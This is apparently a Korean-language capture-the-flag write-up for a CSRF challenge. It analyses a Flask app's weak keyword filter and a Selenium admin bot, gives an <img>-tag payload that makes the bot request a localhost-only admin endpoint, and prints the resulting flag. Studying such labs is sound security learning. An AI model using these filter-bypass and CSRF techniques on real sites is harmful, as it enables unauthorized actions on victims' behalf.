### Challenge Analysis
이번 문제는 csrf를 통해 서버 내부에 작동중인 셀레니움을 통해 서버를 속여  
특정 조건을 가진 사용자만 접근 가능한 페이지를 우회해 flag를 얻는 문제예요.  

페이로드 순서는 다음과 같아요.  
1. 로컬 환경에서만 접근 가능한 "/admin/notice_flag" 페이지에 붙기 위해 셀레니움 봇을 이용해요.  
2. xss 필터링 함수를 우회할 코드를 짜서 익스플로잇해요.  

______________________________


### CRSF?(cross-site request forgery)
> 권한을 가지고 있는 사용자의 브라우저를 속여서 피해자가 의도하지 않은 요청을 보내는 공격.  

## source code analyze

코드가 길어서 필요한 부분만 분석해볼께요.

```python
def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        if not check_csrf(param):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", None)
    if text:
        memo_text += text
    return render_template("memo.html", memo=memo_text)


@app.route("/admin/notice_flag")
def admin_notice_flag():
    global memo_text
    if request.remote_addr != "127.0.0.1":
        return "Access Denied"
    if request.args.get("userid", "") != "admin":
        return "Access Denied 2"
    memo_text += f"[Notice] flag is {FLAG}\n"
    return "Ok"
```

______________________________

check_csrf 함수를 봐볼께요.사용자가 파라미터에 값을 넣으면 셀레니움 봇이 값을 로컬로 입력받아서  
url 변수에 담아요. 즉, 이 함수를 이용해서 로컬 주소로 "/admin/notice_flag"에 접근할 수 있어요.  
또한 xss 공격을 방지하기 위해 frame, script, on 태그를 *로 치환하고 있어요. 다른 태그를 사용해야해요.

```python
def check_csrf(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "").lower()
    xss_filter = ["frame", "script", "on"]
    for _ in xss_filter:
        param = param.replace(_, "*")
    return param
```

______________________________

공격자는 이 페이지에서 param 변수에 값을 넣어야해요.  
조건문을 보면 check_csrf에서 필터링 되었다면 "wrong" 문구를 리턴한다는걸 알 수 있어요.  
다른 태그를 사용해서 우회하면 그만이에요.

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param", "")
        if not check_csrf(param):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'
```

______________________________

우리가 접근해야할 페이지 코드예요. 접근 가능한 조건을 봐볼께요.  
먼저 "127.0.0.1" 그러니까 로컬로 붙어야하며, userid가 "admin"이여야해요.  
x-forwarded-for 헤더를 사용해 우회할 수 있나 싶었지만 해당 문제는 셀레니움을 사용해서 불가능해요.   
따라서 문제에서 주어진 장치인 셀레니움을 이용해요(재밌게도 셀레니움 때문에 헤더 조작이 불가능함과 동시에 이게 또 취약점이 돼요) 

userid 로직을 보면 그냥 이름이 "admin"이면 검증 끝! 다른건 없어요.  
따라서 페이로드를 보낼 때 쿼리 스트링으로 값을 붙여주면 돼요.

```python
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", None)

        memo_text += text
    return render_template("memo.html", memo=memo_text)

```

### Payload

아래 세 가지에 유의하며 페이로드를 짜볼께요.

1. 로컬로 붙기.  
2. xss 필터링 우회하기  
3. userid를 admin으로 변조(?)하기.  

사실 /flag 페이지에서 파라미터에 값을 넣기만하면 알아서 셀레니움이 값을 받고 서버에 넘겨요.  
1번은 크게 신경 안써도 되는 부분이었어요.  

xss 필터링에는 **frame, script, on** 이렇게 세 가지가 있었어요.  
우리는 셀레니움이 "/admin/notice_flag"로 가게 해야하기에 링크를 읽게 할 태그가 필요한데 `<img>`를 사용하면 돼요.    

그럼 페이로드는 이렇게 나와요.  
```html
<img src="/admin/notice_flag?userid=admin">
```
혹은 더 확실하게 하고 싶다면.
```html
<img src="http://127.0.0.1:8000/admin/notice_flag?userid=admin">
```

위 페이로드를 "/flag" 페이지의 입력 폼에 넣고서 "/memo" 페이지로 이동하면  
<img src="/images/csrf-1/flag.png" width="500" />  

flag가 출력되어 있어요!

```html
[Notice] flag is DH{11a230801ad0b80d52b996cbe203e83d}
```
